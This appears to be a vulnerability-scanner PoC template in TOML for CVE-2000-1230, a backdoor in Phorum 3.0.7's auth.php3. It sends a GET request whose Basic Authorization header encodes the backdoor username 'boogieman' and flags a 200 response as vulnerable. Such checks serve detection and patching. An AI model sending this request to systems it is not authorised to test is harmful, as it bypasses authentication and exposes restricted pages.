[info]
author = "ave"
description = "Phorum 3.0.7 的 auth.php3 存在后门，设置 PHP_AUTH_USER=boogieman 即可绕过身份验证访问受限页面"
id = "POC-AVE-2000-0849"
name = "Phorum 3.0.7 auth.php3 后门访问漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-1230",
    "phorum",
    "backdoor",
]
vuln_id = [
    "CVE-2000-1230",
    "AVE-2000-0849",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/auth.php3"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic Ym9vZ2llbWFuOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
